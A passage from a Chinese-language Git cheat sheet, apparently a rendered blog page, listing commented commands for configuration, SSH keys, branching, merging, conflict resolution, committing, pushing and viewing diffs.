href="#%E8%A7%A3%E5%86%B3%E5%86%B2%E7%AA%81">解决冲突</a></li><li><a href="#%E6%9A%82%E5%AD%98">暂存</a></li><li><a href="#%E5%88%A0%E9%99%A4">删除</a></li><li><a href="#%E6%8F%90%E4%BA%A4">提交</a></li><li><a href="#%E6%8E%A8%E9%80%81">推送</a></li><li><a href="#%E6%9B%B4%E6%96%B0">更新</a></li><li><a href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84%E6%94%B9%E5%8A%A8">查看文件的改动</a></li><li><a href="#%E5%9B%9E%E6%BB%9A%E7%89%88%E6%9C%AC">回滚版本</a></li><li><a href="#%E6%92%A4%E9%94%80">撤销</a></li><li><a href="#%E6%A0%87%E7%AD%BE">标签</a></li><li><a href="#Rebase">Rebase</a></li><li><a href="#git-flow">git-flow</a></li><li><a href="#%E5%AD%90%E6%A8%A1%E5%9D%97">子模块</a></li><li><a href="#Bisect">Bisect</a></li><li><a href="#%E5%B8%AE%E5%8A%A9">帮助</a></li><li><a href="#%E6%B8%85%E7%A9%BAcommit%E5%8E%86%E5%8F%B2">清空commit历史</a></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a></li><li><a href="#%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7">奇技淫巧</a></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看全局配置列表</span></span><br><span class="line">git config -l</span><br><span class="line"><span class="comment"># 查看局部配置列表</span></span><br><span class="line">git config --<span class="built_in">local</span> --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已设置的全局用户名/邮箱</span></span><br><span class="line">git config --global --get user.name</span><br><span class="line">git config --global --get user.email</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局用户名/邮箱</span></span><br><span class="line">git config --global user.name <span class="string">&quot;xiejiahe&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;example@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置本地当前工作区仓库用户名/邮箱</span></span><br><span class="line">git config --<span class="built_in">local</span> user.name <span class="string">&quot;xiejiahe&quot;</span></span><br><span class="line">git config --<span class="built_in">local</span> user.email <span class="string">&quot;example@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除配置</span></span><br><span class="line">git config --<span class="built_in">unset</span> --global user.name</span><br><span class="line">git config --<span class="built_in">unset</span> --global user.email</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将默认文本编辑器设置为 emacs</span></span><br><span class="line">git config --global core.editor emacs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将默认差异化分析工具设置为 vimdiff</span></span><br><span class="line">git config --global merge.tool vimdiff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑当前仓库配置文件</span></span><br><span class="line">git config -e  <span class="comment"># 等价 vi .git/config</span></span><br></pre></td></tr></table></figure><p><strong>命令别名配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git st 等价于 git status</span></span><br><span class="line">git config --global alias.st status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果之前添加过，需要添加 --replace-all 进行覆盖</span></span><br><span class="line">git config --global alias.st status --replace-all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部命令, 只要在前面加 ! 即可</span></span><br><span class="line">git config --global alias.st <span class="string">&#x27;!echo hello&#x27;</span>;</span><br><span class="line"><span class="comment"># 可以利用外部命令执行一段复杂的合并代码过程，例如：</span></span><br><span class="line">git config --global alias.mg <span class="string">&#x27;!git checkout develop &amp;&amp; git pull &amp;&amp; git merge master &amp;&amp; git checkout -&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 st 别名</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> alias.st</span><br></pre></td></tr></table></figure><p><strong>给git设置代理</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置</span></span><br><span class="line">git config --global https.proxy  http://127.0.0.1:1087</span><br><span class="line">git config --global http.proxy  http://127.0.0.1:1087</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h2 id="生成SSHKey"><a href="#生成SSHKey" class="headerlink" title="生成SSHKey"></a>生成SSHKey</h2><p>1、替换为您的GitHub电子邮件地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>2、当提示“输入要在其中保存密钥的文件”时，按Enter。接受默认文件位置。 (建议修改名字，防止以后被覆盖)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; Enter a file in which to save the key (&#x2F;Users&#x2F;you&#x2F;.ssh&#x2F;id_rsa): [Press enter]</span><br></pre></td></tr></table></figure><p>3、在提示符下，键入一个安全密码, 默认回车即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Enter passphrase (empty <span class="keyword">for</span> no passphrase): [Type a passphrase]</span><br><span class="line">&gt; Enter same passphrase again: [Type passphrase again]</span><br></pre></td></tr></table></figure><p>4、生成的SSH Key 添加到 <code>ssh config</code> 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.ssh/config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 粘贴</span></span><br><span class="line">Host *</span><br><span class="line">  AddKeysToAgent yes</span><br><span class="line">  UseKeychain yes</span><br><span class="line">  IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>最后将公钥添加到 <a href="https://github.com/settings/keys">https://github.com/settings/keys</a> 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><h2 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h2><p><code>git init</code> 创建一个空的Git仓库或重新初始化一个现有的仓库</p><p>实际上 <code>git init</code> 命令用得不多，通常在网页上进行操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 会在当前目录生成.git</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以安静模式创建，只会打印错误或警告信息</span></span><br><span class="line">git init -q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个裸仓库, 通常情况下用不上</span></span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure><h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https 协议</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/xjh22222228/git-manual.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH协议</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:xjh22222228/git-manual.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆某个分支， -b 指定分支名字</span></span><br><span class="line">git <span class="built_in">clone</span> -b master https://github.com/xjh22222228/git-manual.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归克隆，如果项目包含子模块就非常有用</span></span><br><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:xjh22222228/git-manual.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆深度为1, 只克隆指定分支, 历史记录只克隆最后一条, 减少克隆时间</span></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/xjh22222228/git-manual.git</span><br></pre></td></tr></table></figure><h2 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h2><p>检出某次commit提交, 如果当前分支上的某次提交的修改正是当前需要的，那么可以使用此命令进行操作。</p><p>需要注意的是提交时必须使用 <code>git push -f</code> 强制提交方式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通常情况执行此命令会产生冲突，需要手动去解决</span></span><br><span class="line">git cherry-pick &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留原有作者信息进行提交</span></span><br><span class="line">git cherry-pick -x 8f6c26fc122502886bdfd9aa55ecda26a3ccc31d</span><br></pre></td></tr></table></figure><h2 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 完整查看文件状态</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以短格式给出输出</span></span><br><span class="line">git status -s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略子模块</span></span><br><span class="line">git status --ignore-submodules</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示已忽略的文件</span></span><br><span class="line">git status --ignored</span><br></pre></td></tr></table></figure><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看完整历史提交记录</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看前N次提交记录 commit message</span></span><br><span class="line">git <span class="built_in">log</span> -2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看前N次提交记录，包括diff</span></span><br><span class="line">git <span class="built_in">log</span> -p -2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索关键词</span></span><br><span class="line">git <span class="built_in">log</span> -S Java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只显示合并日志</span></span><br><span class="line">git <span class="built_in">log</span> --merges</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以图形查看日志记录, --oneline 可选</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出提交者贡献数量, 只会打印作者和贡献数量</span></span><br><span class="line">git shortlog -sn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以提交贡献数量排序并打印出message</span></span><br><span class="line">git shortlog -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 采用邮箱格式化的方式进行查看贡献度</span></span><br><span class="line">git shortlog -e</span><br></pre></td></tr></table></figure><h2 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h2><p><code>git blame</code> 意思是责怪，你懂的。</p><p><code>git blame</code> 用于查看某个文件的修改历史记录是哪个作者进行了改动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 README.md 文件的修改历史记录，包括时间、作者以及内容</span></span><br><span class="line">git blame README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看谁改动了 README.md 文件的 11行-12行</span></span><br><span class="line">git blame -L 11,12 README.md</span><br><span class="line">git blame -L 11 README.md   <span class="comment"># 查看第11行以后</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示完整的 hash 值</span></span><br><span class="line">git blame -l README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示修改的行数</span></span><br><span class="line">git blame -n README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示作者邮箱</span></span><br><span class="line">git blame -e README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对参数进行一个组合查询</span></span><br><span class="line">git blame -enl -L 11 README.md</span><br></pre></td></tr></table></figure><h2 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有分支</span></span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地分支</span></span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看远端分支</span></span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地分支所关联的远程分支</span></span><br><span class="line">git branch -vv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地 master 分支创建时间</span></span><br><span class="line">git reflog show --date=iso master</span><br></pre></td></tr></table></figure><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2种方法，切换到master分支</span></span><br><span class="line">git checkout master</span><br><span class="line">git switch master  <span class="comment"># git &gt;= 2.23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换上一个分支</span></span><br><span class="line">git checkout -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换远端分支</span></span><br><span class="line">git checkout -t origin/dev</span><br></pre></td></tr></table></figure><h2 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建develop本地分支</span></span><br><span class="line">git branch develop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地develop分支并切换</span></span><br><span class="line">git checkout -b develop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建远程分支, 实际上创建本地分支然后推送</span></span><br><span class="line">git checkout -b develop</span><br><span class="line">git push origin develop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个空的分支, 不继承父分支，历史记录是空的，一般至少需要执行4步</span></span><br><span class="line">git checkout --orphan develop</span><br><span class="line"><span class="comment"># 这一步可选，如果你真的想创建一个没有任何文件的分支</span></span><br><span class="line">git rm -rf .</span><br><span class="line"><span class="comment"># 添加并提交，否则分支是隐藏的 （执行这一步之前需要注意当前工作区必须保留一个文件，否则无法提交）</span></span><br><span class="line">git add -A &amp;&amp; git commit -m <span class="string">&quot;提交&quot;</span></span><br><span class="line"><span class="comment"># 推送到远程</span></span><br><span class="line">git push --set-upstream origin develop</span><br></pre></td></tr></table></figure><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除本地分支</span></span><br><span class="line">git branch -d &lt;branchName&gt;</span><br><span class="line">git branch -D &lt;branchName&gt; <span class="comment"># 删除远程分支后，想删除本地分支需要执行 -D 参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">git push origin :&lt;branchName&gt;</span><br><span class="line">git push origin --delete &lt;branch-name&gt;  <span class="comment"># &gt;= 1.7.0</span></span><br></pre></td></tr></table></figure><h2 id="重命名分支"><a href="#重命名分支" class="headerlink" title="重命名分支"></a>重命名分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名当前分支, 通常情况下需要执行3步</span></span><br><span class="line"><span class="comment"># 1、修改分支名称</span></span><br><span class="line"><span class="comment"># 2、删除远程旧分支</span></span><br><span class="line"><span class="comment"># 3、将重命名分支推送到远程</span></span><br><span class="line">git branch -m &lt;branchName&gt;</span><br><span class="line">git push origin :old_branch</span><br><span class="line">git push -u origin new_branch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重命名指定分支</span></span><br><span class="line">git branch -m old_branch new_branch</span><br></pre></td></tr></table></figure><hr><h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 feature/v1.0.0 分支代码合并到 develop</span></span><br><span class="line">git checkout develop</span><br><span class="line">git merge feature/v1.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以安静模式合并, 把develop分支合并到当前分支并不输出任何信息</span></span><br><span class="line">git merge develop -q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并不编辑消息, 跳过交互</span></span><br><span class="line">git merge develop --no-edit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并分支后不进行提交</span></span><br><span class="line">git merge develop --no-commit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出合并，恢复到合并之前的状态</span></span><br><span class="line">git merge --abort</span><br></pre></td></tr></table></figure><h2 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h2><p><strong>代码合并/更新代码</strong> 经常会遇到冲突的情况。</p><p>1、按照惯例直接把代码提交到远程, 有几种情况:</p><ul><li>代码顺利的推送的远程分支 (无需理会)</li><li>出现冲突, git自动做了合并 (无需理会)</li><li>git发现本地文件在远端做了修改，需要进行 git pull<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>出现冲突，如图：</li></ul><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-conflict-1.png" width="400"><p>2、按照提示执行 <code>git pull</code> 拉取代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><p>提示有文件存在冲突，如图：</p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-conflict-2.png" width="400"><p>3、编辑冲突文件, 解决冲突需要自己去判断到底要保留远端代码还是本地代码或者两端都保留。</p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-conflict-3.png" width="400"><p>4、这是解决后的代码，保留了本地代码</p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-conflict-4.png" width="400"><p>最后按照惯例，把代码推送到远端即可。</p><p>除了使用git命令解决以外, 可以使用一些开发工具自带git进行处理。</p><p>另外推荐2个工具专门处理git冲突：</p><ul><li><a href="http://meld.sourceforge.net/install.html">meld</a></li><li><a href="http://kdiff3.sourceforge.net/">kdiff3</a></li></ul><p><a href="https://gitguys.com/topics/merging-with-a-gui/">这篇文章专门介绍这2个工具如何使用</a></p><h2 id="暂存"><a href="#暂存" class="headerlink" title="暂存"></a>暂存</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暂存所有</span></span><br><span class="line">git add -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存某个文件</span></span><br><span class="line">git add ./README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存当前目录所有改动文件</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存一系列文件</span></span><br><span class="line">git add 1.txt 2.txt ...</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>git add 的反向操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除1.txt 文件</span></span><br><span class="line">git rm 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除当前所有文件, 与rm -rf 命令不同的是不会删除 .git 目录</span></span><br><span class="line">git rm -rf .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除当前工作区缓存，但不会删除文件，通常用于修改文件名不生效问题</span></span><br><span class="line">git rm -r --cached .</span><br></pre></td></tr></table></figure><h2 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -m 提交的信息</span></span><br><span class="line">git commit -m <span class="string">&quot;changes log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只提交某个文件</span></span><br><span class="line">git commit README.md -m <span class="string">&quot;message&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交并显示diff变化</span></span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许提交空消息，通常必须指定 -m 参数</span></span><br><span class="line">git commit --allow-empty-message</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重写上一次提交信息，确保当前工作区没有改动</span></span><br><span class="line">git commit --amend -m <span class="string">&quot;新的提交信息&quot;</span></span><br></pre></td></tr></table></figure><h2 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 推送内容到主分支</span></span><br><span class="line">git push -u origin master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地分支推送到远程， 本地分支:远程分支</span></span><br><span class="line">git push origin &lt;branchName&gt;:&lt;branchName&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简写，默认推送当前分支</span></span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制推送, -f 是 --force 缩写</span></span><br><span class="line">git push -f</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 推荐，因为不会做自动合并</span></span><br><span class="line">git fetch origin master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相当于git fetch 然后 git merge</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后面的意思是： 远程分支名:本地分支名</span></span><br><span class="line">git pull origin master:master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是要与本地当前分支合并，则冒号后面的&lt;本地分支名&gt;可以不写</span></span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><hr><h2 id="查看文件的改动"><a href="#查看文件的改动" class="headerlink" title="查看文件的改动"></a>查看文件的改动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有文件改动</span></span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看具体文件的改动</span></span><br><span class="line">git diff README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看某个版本的改动, 后面那一窜是commitId， git log后就能看到</span></span><br><span class="line">git diff d68a1ef2407283516e8e4cb675b434505e39dc54</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看某个文件的历史修改记录</span></span><br><span class="line">git <span class="built_in">log</span> README.md</span><br><span class="line">git show d68a1ef2407283516e8e4cb675b434505e39dc54 README.md</span><br></pre></td></tr></table></figure><hr><h2 id="回滚版本"><a href="#回滚版本" class="headerlink" title="回滚版本"></a>回滚版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 